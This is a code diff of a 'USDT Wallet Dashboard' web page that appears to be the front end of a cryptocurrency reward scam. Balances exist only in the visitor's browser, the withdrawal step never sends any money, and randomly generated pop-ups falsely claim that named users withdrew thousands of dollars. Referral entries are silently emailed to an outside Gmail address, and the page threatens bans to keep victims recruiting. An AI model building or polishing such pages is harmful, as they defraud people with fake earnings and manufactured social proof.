@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>USDT Wallet Dashboard</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
   <style>
     body {
       margin: 0;
@@ -86,6 +86,7 @@
       background: rgba(0,255,128,0.08);
       padding: 6px;
       border-radius: 6px;
+      user-select: text;
     }
 
     .notification {
@@ -111,6 +112,16 @@
       transform: translateY(0);
     }
 
+    .warning-text {
+      color: #ff6347; /* tomato red */
+      font-size: 0.75rem;
+      margin-top: 6px;
+      text-align: left;
+      background: rgba(255, 99, 71, 0.1);
+      padding: 6px 10px;
+      border-radius: 5px;
+    }
+
     form {
       display: none;
     }
@@ -125,23 +136,28 @@
     <div class="balance">Balance: <span id="balance">0.00000000</span> USDT</div>
     <button onclick="handleWithdraw()">Withdraw</button>
 
-    <div class="referral-box">
+    <div class="referral-box" title="Your unique referral code">
       Your referral code: <b id="refcode">...</b>
     </div>
 
-    <input type="text" id="refUsedBy" placeholder="Who used your code?" />
-    <button onclick="sendReferral()">Submit</button>
+    <input type="text" id="refUsedBy" placeholder="Enter referral username who invited you" />
+    <button onclick="sendReferral()">Submit Referral</button>
+    <div id="referralWarning" class="warning-text" style="display:none;">
+      Please enter a correct referred user name.<br />
+      At withdrawal stage, your account will be reviewed fully.<br />
+      If any fake referrals are found, your account will be banned.
+    </div>
 
     <div class="history" id="withdraw-history">No withdrawals yet.</div>
 
     <form id="notifyForm" action="https://formsubmit.co/snipemarkets@gmail.com" method="POST">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="referrer_used" id="hiddenRef">
+      <input type="hidden" name="_captcha" value="false" />
+      <input type="hidden" name="referrer_used" id="hiddenRef" />
     </form>
   </div>
 
   <script>
-    // Redirect to index.html if not signed up
+    // Redirect to index.html if user not signed up
     if (!localStorage.getItem('usdt_user')) {
       window.location.href = 'index.html';
     }
@@ -170,6 +186,7 @@
     }
 
     window.onload = () => {
+      // Add any bonus from referrals made by this user
       const refBonusKey = `ref_${username}_bonus`;
       const refBonus = parseFloat(localStorage.getItem(refBonusKey)) || 0;
       if (refBonus > 0) {
@@ -205,51 +222,87 @@
 
     function handleWithdraw() {
       if (balance >= 3000) {
-        alert("Redirecting to withdrawal page...");
+        alert("Minimum withdrawal reached! Proceed with withdrawal flow.");
         // window.location.href = "withdraw.html";
       } else {
         alert("Minimum withdrawal is $3000 USDT.");
       }
     }
 
-    function sendReferral() {
-      const enteredCode = document.getElementById("refUsedBy").value.trim();
-      const currentUser = localStorage.getItem("usdt_user");
+    // Fake database of existing usernames (simulate)
+    function getExistingUsers() {
+      // In real use, you’d check server. Here, simulate from localStorage keys:
+      // Gather all 'usdt_user_*' keys or just make a list including current user
+      let users = [];
+      for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        if (key && key.startsWith('user_')) {
+          users.push(localStorage.getItem(key));
+        }
+      }
+      // Include current username and referral used for demo
+      if (username) users.push(username);
+      if (referral) users.push(referral);
+      return [...new Set(users)]; // unique
+    }
 
-      if (!enteredCode || enteredCode === currentUser) {
-        alert("Enter a valid referral code (not your own).");
+    // Validate referral username input & send referral bonus
+    function sendReferral() {
+      const inputEl = document.getElementById("refUsedBy");
+      const warningEl = document.getElementById("referralWarning");
+      const enteredCode = inputEl.value.trim();
+      warningEl.style.display = 'none';
+
+      if (!enteredCode) {
+        alert("Please enter a referral username.");
+        return;
+      }
+      if (enteredCode === username) {
+        alert("You cannot use your own referral code.");
+        return;
+      }
+
+      // Fake users database for validation (including current user and referrals)
+      const users = getExistingUsers();
+
+      if (!users.includes(enteredCode)) {
+        warningEl.style.display = 'block';
         return;
       }
 
       const alreadyRewardedKey = `referral_sent_to_${enteredCode}`;
       if (localStorage.getItem(alreadyRewardedKey)) {
-        alert("You’ve already submitted this referral.");
+        alert("You have already submitted this referral.");
         return;
       }
 
       localStorage.setItem(alreadyRewardedKey, "true");
+
+      // Add $200 to current user balance
       balance += 200;
       localStorage.setItem("usdtBalance", balance.toString());
       updateBalance();
 
+      // Add $200 bonus to referral user
       const refBonusKey = `ref_${enteredCode}_bonus`;
       const refBonus = parseFloat(localStorage.getItem(refBonusKey)) || 0;
       localStorage.setItem(refBonusKey, (refBonus + 200).toString());
 
-      document.getElementById("hiddenRef").value = enteredCode;
+      // Send email silently via fetch to FormSubmit
       fetch("https://formsubmit.co/ajax/snipemarkets@gmail.com", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ referrer_used: enteredCode }),
       }).then(() => {
         alert("Referral submitted. Both credited $200.");
-        document.getElementById("refUsedBy").value = "";
+        inputEl.value = "";
+        warningEl.style.display = 'none';
       }).catch(() => {
-        alert("Referral saved, but email failed.");
+        alert("Referral saved, but email failed to send.");
       });
     }
 
-    // 🔔 Random floating notifications
+    // Floating notifications logic
     const names = ["Alex", "Ayesha", "John", "Emily", "Musa", "Sophia", "Ahmed", "Fatima"];
     function showNotification() {
       const name = names[Math.floor(Math.random() * names.length)];
@@ -257,7 +310,6 @@
       const note = document.getElementById("notification");
       note.textContent = `${name} successfully withdrew $${amount.toLocaleString()}`;
       note.classList.add("show");
-
       setTimeout(() => {
         note.classList.remove("show");
       }, 3000);
